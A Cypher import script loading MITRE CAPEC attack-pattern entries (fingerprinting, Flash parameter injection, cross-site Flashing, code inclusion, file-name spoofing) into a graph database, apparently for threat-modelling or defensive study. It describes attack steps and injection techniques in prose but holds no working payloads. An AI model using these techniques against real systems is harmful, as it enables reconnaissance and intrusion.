CREATE (:AttackStep{id: 1, title: "Request Footprinting", description: "<div level=\"0\">\n  <p class=\"text\">The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The response contains sensitive information such as ports open, network block, server version etc.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The response does not contain sensitive information about the system and network.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of sensitive information about the system and network."});
CREATE (:Outcome{id: 2, type: "Failure", description: "There is no information available about the system and network."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
MERGE (:Reference{local_id: "R.169.1", author: "Manic Velocity", title: "Footprinting And The Basics Of Hacking", link: "http://web.textfiles.com/hacking/footprinting.txt"});
MERGE (:Reference{local_id: "R.169.2", author: "Eddie Sutton", title: "Footprint: What Is And How Do You Erase Them", link: "http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf"});
MERGE (:Reference{id: "REF-20", local_id: "R.169.3", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pp. 38-39", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-22", local_id: "R.169.4", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.1 Introduction, pg. 47", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:CWE{id: 200});
CREATE (:ResourcesRequired{id: 70, text: "<div level=\"0\">\n  <p class=\"text\">The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.</p>\n</div>"});
CREATE (:AttackPattern{id: 17, name: "Accessing, Modifying or Executing Executable Files", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 121, text: "<div level=\"0\">\n  <p class=\"text\">System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.</p>\n</div>"});
CREATE (:Submission{id: 147});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 113});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 114});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 147, summary: "OrderedDict([('Text', \"An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.\")])"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.17.2", author: "ATT&CK Project", title: "File System Permissions Weakness (T1044)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Technique/T1044"});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 272});
MERGE (:CWE{id: 59});
MERGE (:CWE{id: 282});
MERGE (:CWE{id: 275});
MERGE (:CWE{id: 264});
MERGE (:CWE{id: 270});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 71, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</p>\n</div>"});
CREATE (:AttackPattern{id: 170, name: "Web Application Fingerprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 122, text: "<div level=\"0\">\n  <p class=\"text\">Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.</p>\n</div>"});
CREATE (:Submission{id: 148});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 115});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 116});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 117});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 118});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Description{id: 148, summary: "OrderedDict([('Text', 'An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Request fingerprinting", description: "<div level=\"0\">\n  <p class=\"text\">Use automated tools or send web server specific commands to web server and wait for server's response.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use automated tools or send web server specific commands to web server and then receive server's response.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">HTTP response headers contain fingerprinting sensitive fields indicating server's vendors and versions.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">HTTP response headers do not contain fingerprinting sensitive fields indicating server's vendors and versions.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of fingerprinting sensitive information from HTTP response headers."});
CREATE (:Outcome{id: 1, type: "Failure", description: "There is no HTTP response header information available."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Increase the accuracy of server fingerprinting of Web servers", description: "<div level=\"0\">\n  <p class=\"text\">Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Send bad requests or requests of nonexistent pages to the server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attacker takes existing automated tools to recognize the type and the version of the web server in use.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Find different inner reordering of headers in HTTP response due to different versions of the server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Every server answers to a Bad request in a different way due to different versions of the server.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Find signatures of web servers in database of automated tools.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">HTTP response headers all look like identical.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully identifies server's vendors and versions."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Identify Web Application Software", description: "<div level=\"0\">\n  <p class=\"text\">After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Examine the HTTP Response Headers. This may leak information about software signatures</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Examine Cookies that may contain server's software information.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Check error pages.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">File name extensions can be found in the URL.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">HTTP Response headers show software version.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Cookies leak information for server's version.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">From error messages, the stack trace of errors and exceptions may also explicitly tell application software information.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "File name extensions can be found in the URL."});
CREATE (:Outcome{id: 1, type: "Success", description: "HTTP Response headers show software version."});
CREATE (:Outcome{id: 1, type: "Success", description: "Cookies leak information for server's version."});
CREATE (:Outcome{id: 1, type: "Success", description: "From error messages, the stack trace of errors and exceptions may also explicitly tell application software information."});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully identifies web application software vendors and versions."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:SecurityControl{id: 6, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Identify Backend Database Version", description: "<div level=\"0\">\n  <p class=\"text\">Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use tools to send bogus SQL query to the server and check error pages.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Get error messages from SQL response.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">No error messages.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully identifies database type from error messages."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker fails to identify database type from error messages."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{local_id: "R.170.1", author: "Saumil Shah", title: "An Introduction to HTTP fingerprinting", link: "http://net-square.com/httprint/httprint_paper.html"});
MERGE (:Reference{id: "REF-4", local_id: "R.170.2", title: "OWASP Testing Guide", section: "Testing for Web Application Fingerprint (OWASP-IG-004)", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Web_Application_Fingerprint_%28OWASP-IG-004%29"});
MERGE (:Reference{local_id: "R.170.3", title: "HTTP 1.1 Specification (RFC 2616)", link: "http://www.ietf.org/rfc/rfc2616.txt"});
MERGE (:Reference{id: "REF-1", local_id: "R.170.4", title: "WASC Threat Classification 2.0", section: "WASC-45 - Fingerprinting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Fingerprinting"});
CREATE (:ResourcesRequired{id: 72, text: "<div level=\"0\">\n  <p class=\"text\">While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.</p>\n</div>"});
CREATE (:AttackPattern{id: 171, name: "DEPRECATED: Variable Manipulation", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 149});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 119});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 120});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Severity"});
CREATE (:PreviousEntryName{id: 29, name: "Variable Manipulation"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 149, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of the existing attack pattern \"CAPEC-77 : Manipulating User-Controlled Variables\". Please refer to this other CAPEC going forward.')])"});
CREATE (:AttackPattern{id: 173, name: "Action Spoofing", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 123, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must convince the victim into performing the decoy action.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 124, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have the means to control a user's interface to present them with a decoy action as well as the actual malicious action. Simple versions of this attack can be performed using web pages requiring only that the adversary be able to host (or control) content that the user visits.</p>\n</div>"});
CREATE (:Submission{id: 150});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 121});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 150, summary: "OrderedDict([('Text', \"An adversary is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Adversaries may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.\")])"});
CREATE (:AttackPattern{id: 174, name: "Flash Parameter Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 151});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 122});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases, Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 151, summary: "OrderedDict([('Text', \"An adversary injects values to global parameters into a Flash movie embedded in an HTML document. These injected parameters are controlled through arguments in the URL used to access the embedding HTML document. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. The injected parameters can allow the adversary to control other objects within the Flash movie as well as full control over the parent document's DOM model.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash movies. If there is an embedded Flash movie, he lists how to pass global parameters to the Flash movie from the embedding object.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated tool to record all instances of URLs which have embedded Flash movies and list the parameters passing to the Flash movie.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website to see whether the HTML document has embedded Flash movies or not and list the parameters passing to the Flash movie.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The HTML document has embedded Flash movies.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The HTML file doesn't appear to contain Flash movies, but Ajax request seems possible and could insert Flash movies.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs which has embedded Flash movies and the list of parameters passing to the Flash movies."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine the application susceptibility to Flash parameter injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the attack attempts to use various techniques such as DOM based, reflected, flashvars, persistent attacks depending on the type of parameter passed to the embedded Flash movie.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">When the JavaScript 'document.location' variable is used as part of parameter, inject '#' and payload into the parameter in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">When the name of the Flash movie is exposed as a form or a URL parameter, the attacker injects '?' and payload after the movie name in the URL to overrides some global value.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">When the arguments passed in the 'flashvars' attributes, the attacker injects '&' and payload in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash movie is loaded.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one URL is found susceptible to flash parameter injection."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No URL is found susceptible to injection."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{local_id: "R.174.1", author: "['Yuval B.', 'Ayal Y.', 'Adi S.']", title: "Flash Parameter Injection: A Security Advisory", publisher: "IBM Rational Security Team", pubdate: "September 24, 2008", link: "http://blog.watchfire.com/FPI.pdf"});
CREATE (:CVE{id: "CAPEC-246", description: "<div level=\"0\">\n  <p class=\"text\">Cross-Site Scripting using Flash</p>\n</div>"});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 185});
MERGE (:CWE{id: 697});
CREATE (:ResourcesRequired{id: 73, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must convince the victim to click their crafted link.</p>\n</div>"});
CREATE (:AttackPattern{id: 175, name: "Code Inclusion", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 125, text: "<div level=\"0\">\n  <p class=\"text\">The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 126, text: "<div level=\"0\">\n  <p class=\"text\">The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.</p>\n</div>"});
CREATE (:Submission{id: 152});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 123});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 152, summary: "OrderedDict([('Text', 'An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.')])"});
MERGE (:CWE{id: 829});
CREATE (:ResourcesRequired{id: 74, text: "<div level=\"0\">\n  <p class=\"text\">The adversary may need the capability to host code modules if they wish their own code files to be included.</p>\n</div>"});
CREATE (:AttackPattern{id: 176, name: "Configuration/Environment Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 127, text: "<div level=\"0\">\n  <p class=\"text\">The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement.</p>\n</div>"});
CREATE (:Submission{id: 153});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:PreviousEntryName{id: 30, name: "Configuration/Environment manipulation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 153, summary: "OrderedDict([('Text', \"An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.\")])"});
CREATE (:ResourcesRequired{id: 75, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.</p>\n</div>"});
CREATE (:AttackPattern{id: 177, name: "Create files with the same name as files protected with a higher classification", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 128, text: "<div level=\"0\">\n  <p class=\"text\">The target application must exclude external files. Most non-trivial applications meet this criterion.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 129, text: "<div level=\"0\">\n  <p class=\"text\">The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 130, text: "<div level=\"0\">\n  <p class=\"text\">The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.</p>\n</div>"});
CREATE (:Submission{id: 154});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 124});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 154, summary: "OrderedDict([('Text', \"An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.\")])"});
MERGE (:Reference{local_id: "R.177.1", publisher: "SecurityInnovation", link: "http://www.securityinnovation.com/library/attacks/implementation.shtml"});
MERGE (:Reference{local_id: "R.177.2", author: "ATT&CK Project", title: "Masquerading (1036)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Masquerading"});
CREATE (:ResourcesRequired{id: 76, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.</p>\n</div>"});
CREATE (:AttackPattern{id: 178, name: "Cross-Site Flashing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 131, text: "<div level=\"0\">\n  <p class=\"text\">The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker.</p>\n</div>"});
CREATE (:Submission{id: 155});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 155, summary: "OrderedDict([('Text', 'An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identification", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated tool to record the variables passed to a flash file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">A URL is passed as parameter to a flash file (SWF).</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No variable appear on the URL. Even though none appear, the flash movie may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Application doesn't use variable to specify what URL to load remote flash movies from.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of flash files, with their corresponding parameters is created by the attacker."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt to inject a remote flash file", description: "<div level=\"0\">\n  <p class=\"text\">The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker's flash movie is being executed in the targeted movie.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The targeted flash movie doesn't appear to allow the inclusion of flash movies from untrusted domains (specified in the crossdomain.xml or in the flash movie itself).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's flash movie can access the targeted flash movie internal variables"});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker's flash movie cannot access any content of the targeted flash movie"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Access or Modify Flash Application Variables", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he targets the content of the flash application to steal variable content, password, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.</p>\n</div>"});
